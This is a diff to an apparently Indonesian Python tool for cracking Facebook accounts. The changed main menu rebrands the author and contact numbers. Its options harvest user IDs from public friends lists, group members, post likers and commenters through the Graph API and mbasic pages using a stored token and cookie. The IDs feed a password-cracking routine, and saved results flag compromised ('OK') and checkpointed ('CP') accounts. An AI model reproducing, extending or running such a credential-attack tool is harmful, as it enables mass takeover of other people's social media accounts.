@@ -300,7 +300,7 @@ def infoauthor():
             exit(f"{N}[{M}×{N}] Sorry, it is wrong")
      
 ### MENU UTAMA ###
-def moch_yayan():
+def moch_yayan(my_name,my_id):
     os.system('clear')
     logo()
     ipm = requests.get(url_ip).json()
@@ -310,38 +310,46 @@ def moch_yayan():
     print(f"{P} [{H}•{P}] ID     : {my_id}")
     print(f"{P} [{H}•{P}] IP     : {IP}")
     print(f"{P} [{H}•{P}] Join   : {waktu}")
-    print("%s══════════════════════════════════════════"%(N))
-    print(f" {BM}OPTION MENU{N}")
-    print(' [%s01%s] Public Friends (%sON%s)'%(H,N,H,N));time.sleep(0.03)
-    print(' [%s02%s] Random ID Massal (%sON%s)'%(H,N,H,N));time.sleep(0.03)
-    print(' [%s03%s] Public Group Member (%sON%s)'%(H,N,H,N));time.sleep(0.03)
-    print(' [%s04%s] Like Posts (%sON%s)'%(H,N,H,N));time.sleep(0.03)
-    print(' [%s05%s] Comment Posts (%sON%s)'%(H,N,H,N));time.sleep(0.03)
-    print(' [%s06%s] Checkpoint Detedtor (%sON%s)'%(H,N,H,N));time.sleep(0.03)
-    print(' [%s07%s] Check Crack Results (%sON%s)'%(H,N,H,N));time.sleep(0.03)
+    print("%s▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄"%(N))
+    print(f" {BM}PILIHAN MENU TOOLS{N}")
+    print(' [%s01%s] Crack ID Publik (%sON%s)'%(H,N,H,N));time.sleep(0.03)
+    print(' [%s02%s] crack ID Massal (%sON%s)'%(H,N,H,N));time.sleep(0.03)
+    print(' [%s03%s] Crack ID Grub Public (%sON%s)'%(H,N,H,N));time.sleep(0.03)
+    print(' [%s04%s] Crack Like Posts (%sON%s)'%(H,N,H,N));time.sleep(0.03)
+    print(' [%s05%s] Crack Comment Posts (%sON%s)'%(H,N,H,N));time.sleep(0.03)
+    print(' [%s06%s] Cek Opsi Checkpoint (%sON%s)'%(H,N,H,N));time.sleep(0.03)
+    print(' [%s07%s] Cek Hasil Crack (%sON%s)'%(H,N,H,N));time.sleep(0.03)
     print(' [%s08%s] SC update info'%(H,N));time.sleep(0.03)
-    print(' [%s00%s] Logout (%sRemove Token/Cookie%s)'%(M,N,M,N));time.sleep(0.03)
-    pepek = input('\n %s[%s?%s] Select menu : '%(N,K,N))
+    print(' [%s00%s] Logout (%sRemove Cookie%s)'%(M,N,M,N));time.sleep(0.03)
+    pepek = input('\n %s[%s?%s] Pilih menu : '%(N,K,N))
     if pepek == '':
-        jalan('\n %s[%s×%s] Sorry the menu selection is wrong...!'%(N,M,N));time.sleep(2);moch_yayan()
+        jalan('\n %s[%s×%s] Sorry the menu selection is wrong...!'%(N,M,N));time.sleep(2);login()
+
+
 ###### CRACK ID PUBLIK SINGEL #####
+
     elif pepek in['1','01']:
         try:
-            print("%s══════════════════════════════════════════\n %sTARGET INFO%s"%(N,BM,N))
-            print(" %s[%s•%s] Type %sME%s crack from friends list"%(N,H,N,H,N))
-            try:user = input(' %s[%s?%s] Enter ID/Uname : %s'%(N,K,N,H));_memek_ = __convert__(user)
-            except AttributeError:exit(f" {N}[{M}×{N}] Incorrect username or ID")
-            r = requests.get(f"https://graph.facebook.com/{_memek_.get('_kontol_')}?fields=friends.limit(5000)&access_token={tokenz}").json()["friends"]
-            for x in r["data"]:
-                id.append(x['id'] + '<=>' + x['name'])
+            token = open('.token.txt','r').read()
+            kukis = open('.cokie.txt','r').read()
+        except IOError:
+           exit()
+        print("ID Target Harus Publik !")
+        pil = input(" Masukan ID :")
+        try:
+                    for pi in requests.get('https://graph.facebook.com/v1.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0],cookies={'cookie': kukis}).json()['friends']['data']:
+                        nama = pi["name"]
+                        id.append(pi['id']+'<=>'+pi['name'])
         except KeyError:
-            jalan(f' %s[%s×%s] Sorry %sID is not public/Invalid token%s'%(N,M,N,M,N));time.sleep(1);moch_yayan()
+                print("Tidak Publik")
+                exit()
 ###### CRACK RANDOM ID MASSAL #####
+
     elif pepek in['2','02']:
         _ngocok_(tokenz)
 ###### CRACK GRUP #####
     elif pepek in['3','03']:
-            print("%s══════════════════════════════════════════\n %sGROUP TARGET INFO%s"%(N,BM,N))
+            print("%s▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\n %sGROUP TARGET INFO%s"%(N,BM,N))
             kontol = input(f" {N}[{K}?{N}] Enter Group ID : {H}")
             if kontol in[""," "]:
                 print('\n %s[%s×%s] Dont be empty...!'%(N,M,N));time.sleep(2);moch_yayan()
@@ -365,9 +373,11 @@ def moch_yayan():
                         crack_grup(f"https://mbasic.facebook.com/browse/group/members/?id={kontol}", kueh)
                 except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
                     exit("\n [!] Sorry no connection")                                   
+
 ###### CRACK LIKE POSTINGAN #####
+
     elif pepek in['4','04']:
-            print("%s══════════════════════════════════════════\n %sLIKE TARGET INFO%s"%(N,BM,N))
+            print("%s▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\n %sLIKE TARGET INFO%s"%(N,BM,N))
             kontol = input(f" {N}[{K}?{N}] Enter Post ID : {H}")
             if kontol in[""," "]:
                 print('\n %s[%s×%s] Dont be empty...!'%(N,M,N));time.sleep(2);moch_yayan()
@@ -381,9 +391,11 @@ def moch_yayan():
                 like_post(f"https://mbasic.facebook.com/ufi/reaction/profile/browser/?ft_ent_identifier={kontol}", kueh)
             except KeyError:
                 print(f"\n [!] Post with ID {kontol} not found");time.sleep(2);moch_yayan()
+
 ###### CRACK KOMENTAR #####
+
     elif pepek in['5','05']:
-            print("%s══════════════════════════════════════════\n %sCOMMENT TARGET INFO%s"%(N,BM,N))
+            print("%s##################################################\n %sCOMMENT TARGET INFO%s"%(N,BM,N))
             kontol = input(f"\n {N}[{K}?{N}] Enter Post ID : {H}")
             if kontol in[""," "]:
                 print('\n %s[%s×%s] Dont be empty...!'%(N,M,N));time.sleep(2);moch_yayan()
@@ -397,40 +409,44 @@ def moch_yayan():
                 ngomen_post(f"https://mbasic.facebook.com/{kontol}", kueh)
             except KeyError:
                 print(f"\n [!] Post with ID {kontol} not found");time.sleep(2);moch_yayan()
+
 ###### CHECKPOINT DETEDTOR #####
+
     elif pepek in['6','06']:
         gabut()
+
 ###### CEK HASIL CRACK #####
     elif pepek in['7','07']:
         dirs = os.listdir("results")
-        print('%s══════════════════════════════════════════\n %sFILE HASIL CRACK%s'%(N,BM,N))
+        print('%s##################################################\n %sFILE HASIL CRACK%s'%(N,BM,N))
         for file in dirs:
             print(" %s[%s+%s] %s"%(N,H,N,file))
         file = input("\n %s%sFILE DETAILS%s\n [%s?%s] File name : %s"%(BM,P,N,K,N,H))
         if file == "":
             file = input("\n %s%sFILE DETAILS%s\n [%s?%s] File name :%s"%(BM,P,N,K,N,H))
         total = open("results/%s"%(file)).read().splitlines()
-        #print("%s══════════════════════════════════════════"%(N));time.sleep(2)
         nm_file = ("%s"%(file)).replace("-", " ")
         hps_nm  = nm_file.replace(".txt", "").replace("OK", "").replace("CP", "").replace("cp_detektor", "").replace("invalid_ok", "")
         jalan(" %s[%s•%s] File date :%s%s\n %s[%s•%s] Total : %s%s%s"%(N,H,N,H,hps_nm,N,H,N,H,len(total),N))
-        print("%s══════════════════════════════════════════"%(N));time.sleep(2)
+        print("%s##################################################"%(N));time.sleep(2)
         for memek in total:
             kontol = memek.replace("\n","")
-            titid  = kontol.replace("[ROY-OK] ","\x1b[1;92m[ROY-OK] ").replace("[ROY-CP] ", "\x1b[1;93m[ROY-CP] ")
+            titid  = kontol.replace("[METAVERS-OK] ","\x1b[1;92m[METAVERS-OK] ").replace("[METAVERS-CP] ", "\x1b[1;93m[METAVERS-CP] ")
             print("%s%s"%(titid,N));time.sleep(0.03)
         jalan("\n %s[%s✓%s] File check complete..."%(N,H,N))
-        input(' [%sPRESS ENTER%s] to continue'%(H,N));moch_yayan()
+        input(' [%sPRESS ENTER%s] Untuk Keluar !'%(H,N));exit()
+
 ###### INFO UPDATE & UPGRADE SC #####
+
     elif pepek in['8','08']:
-        print("%s══════════════════════════════════════════"%(N))
-        jalan(f" {BM}{P}SC INFO{N}\n [{H}•{N}] Author SC : {K}R O Y\n {N}[{H}•{N}] Whatsapp : {K}+601160610812\n {N}[{H}•{N}] Github : {K}https://github.com/ROY-ID\n {N}[{H}•{N}] Status SC : Gratis rasa {H}Premium{N}\n\n {BM}{P}SOURC CODE{N}\n [{H}1{N}] YayanXD      [{H}2{N}] Romi\n [{H}3{N}] RozhakXD     [{H}4{N}] Siapa lagi?\n\n {BM}FIX BUG{N}\n [{H}✓{N}] Terjadinya Error saat memainkan mode pesawat saat proses crack sedang berjalan, kini sudah diperbaiki dan sudah bisa dimainkan mode pesawat saat proses crack sedang berjalan\n [{H}✓{N}] Sedikit perubahan warna text dan tampilan SC\n [{H}✓{N}] Perubahan user agent bawaan SC\n [{H}✓{N}] Penambahan menampilkan {H}Web & Aplikasi AKTIF{N}")
+        print("%s##################################################"%(N))
+        jalan(f" {BM}{P}SC INFO{N}\n [{H}•{N}] Author SC : {K}Strovmirviaska\n {N}[{H}•{N}] Whatsapp : {K}+6282290238779\n {N}[{H}•{N}] Github : {K}https:github.com/Strv-BOT\n {N}[{H}•{N}] Status SC : Gratis rasa {H}Premium{N}\n\n {BM}{P}SOURC CODE{N}\n [{H}1{N}] BotX666_\n\n {BM}FIX BUG{N}\n [{H}✓{N}] Terjadinya Error saat memainkan mode pesawat saat proses crack sedang berjalan, kini sudah diperbaiki dan sudah bisa dimainkan mode pesawat saat proses crack sedang berjalan\n [{H}✓{N}] Sedikit perubahan warna text dan tampilan SC\n [{H}✓{N}] Perubahan user agent bawaan SC\n [{H}✓{N}] Penambahan menampilkan {H}Web & Aplikasi AKTIF{N}")
         upd = input('\n %s[%s?%s] Send direct message to Author [%sY%s/%st%s] : '%(N,K,N,H,N,M,N))
         if upd =="":
             exit(f"{N}[{M}×{N}] Sorry, it is wrong...!")
         elif upd in["Y","y"]:
             jalan("\n %s[%s•%s] %sYou will be redirected to the Author Whatsapp..."%(N,H,N,H));time.sleep(0.02)
-            os.system('xdg-open https://wa.me/601160610812?text=Hallo+izin+menggunakan+SC+ini');time.sleep(2);exit()
+            os.system('xdg-open https://wa.me/+6282290238779?text=Hallo+izin+menggunakan+SC+ini');time.sleep(2);exit()
         elif upd in["T","t"]:
             jalan(f"\n {N}[{H}•{N}] Ok, thank you...")
             jalan(' %s[%s✓%s] Retrun SC type "%spython run.py%s"'%(N,H,N,H,N));exit()
@@ -444,10 +460,10 @@ def moch_yayan():
             sys.stdout.write('\r %s[%s!%s] Deleting Token/Cookie %s'%(N,M,N,x)); sys.stdout.flush()
             time.sleep(1)
         os.system('rm -rf .token.txt');os.system('rm -rf .cokie.txt')
-        jalan('\n %s[%s✓%s] %sSuccessfully delete Token/Cookie...'%(N,H,N,H))
+        jalan('\n %s[%s✓%s] %sSuccessfully delete Cookie...'%(N,H,N,H))
         jalan('\n %s[%s✓%s] Retrun SC type "%spython run.py%s"'%(N,H,N,H,N));exit()
     else:
-        jalan('\n %s[%s×%s] Sorry menu [%s%s%s] moderate improvement...!'%(N,M,N,M,pepek,N));time.sleep(2);moch_yayan()
+        jalan('\n %s[%s×%s] Sorry menu [%s%s%s] moderate improvement...!'%(N,M,N,M,pepek,N));time.sleep(2);login()
     return __crack__().plerr(id)
 ###### CRACK ID RANDOM MASSAL #####
 def _ngocok_(__ppk__):
